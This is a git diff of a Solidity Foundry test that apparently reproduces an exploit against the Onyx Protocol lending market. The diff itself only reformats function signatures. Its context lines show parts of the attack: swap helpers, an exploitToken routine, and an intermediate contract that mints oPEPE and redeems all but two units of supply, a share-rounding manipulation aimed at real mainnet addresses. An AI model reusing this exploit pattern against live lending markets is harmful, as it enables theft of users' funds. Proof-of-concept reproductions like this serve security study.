@@ -22,7 +22,9 @@ interface IComptroller {
         uint256 actualRepayAmount
     ) external view returns (uint256, uint256);
 
-    function enterMarkets(address[] memory cTokens) external returns (uint256[] memory);
+    function enterMarkets(
+        address[] memory cTokens
+    ) external returns (uint256[] memory);
 }
 
 contract ContractTest is Test {
@@ -151,7 +153,9 @@ contract ContractTest is Test {
 
     receive() external payable {}
 
-    function WETHToPEPE(uint256 _amountOut) internal {
+    function WETHToPEPE(
+        uint256 _amountOut
+    ) internal {
         address[] memory path = new address[](2);
         path[0] = address(WETH);
         path[1] = address(PEPE);
@@ -160,7 +164,9 @@ contract ContractTest is Test {
         );
     }
 
-    function USDCToWETH(uint256 _amountOut) internal {
+    function USDCToWETH(
+        uint256 _amountOut
+    ) internal {
         address[] memory path = new address[](2);
         path[0] = address(USDC);
         path[1] = address(WETH);
@@ -169,7 +175,9 @@ contract ContractTest is Test {
         );
     }
 
-    function USDTToWETH(uint256 _amountOut) internal {
+    function USDTToWETH(
+        uint256 _amountOut
+    ) internal {
         address[] memory path = new address[](2);
         path[0] = address(USDT);
         path[1] = address(WETH);
@@ -178,7 +186,9 @@ contract ContractTest is Test {
         );
     }
 
-    function PAXGToWETH(uint256 _amountOut) internal {
+    function PAXGToWETH(
+        uint256 _amountOut
+    ) internal {
         address[] memory path = new address[](2);
         path[0] = address(PAXG);
         path[1] = address(WETH);
@@ -187,7 +197,9 @@ contract ContractTest is Test {
         );
     }
 
-    function DAIToWETH(uint256 _amountOut) internal {
+    function DAIToWETH(
+        uint256 _amountOut
+    ) internal {
         address[] memory path = new address[](2);
         path[0] = address(DAI);
         path[1] = address(WETH);
@@ -196,7 +208,9 @@ contract ContractTest is Test {
         );
     }
 
-    function WBTCToWETH(uint256 _amountOut) internal {
+    function WBTCToWETH(
+        uint256 _amountOut
+    ) internal {
         address[] memory path = new address[](2);
         path[0] = address(WBTC);
         path[1] = address(WETH);
@@ -205,7 +219,9 @@ contract ContractTest is Test {
         );
     }
 
-    function LINKToWETH(uint256 _amountOut) internal {
+    function LINKToWETH(
+        uint256 _amountOut
+    ) internal {
         address[] memory path = new address[](2);
         path[0] = address(LINK);
         path[1] = address(WETH);
@@ -247,7 +263,9 @@ contract ContractTest is Test {
         return b / c;
     }
 
-    function exploitToken(ICErc20Delegate onyxToken) internal {
+    function exploitToken(
+        ICErc20Delegate onyxToken
+    ) internal {
         IntermediateContractToken intermediateToken = new IntermediateContractToken();
         PEPE.transfer(address(intermediateToken), PEPE.balanceOf(address(this)));
         intermediateToken.start(onyxToken);
@@ -295,7 +313,9 @@ contract IntermediateContractToken {
     IUSDT private constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
     IComptroller private constant Unitroller = IComptroller(0x7D61ed92a6778f5ABf5c94085739f1EDAbec2800);
 
-    function start(ICErc20Delegate onyxToken) external {
+    function start(
+        ICErc20Delegate onyxToken
+    ) external {
         PEPE.approve(address(oPEPE), type(uint256).max);
         oPEPE.mint(1e18);
         oPEPE.redeem(oPEPE.totalSupply() - 2);
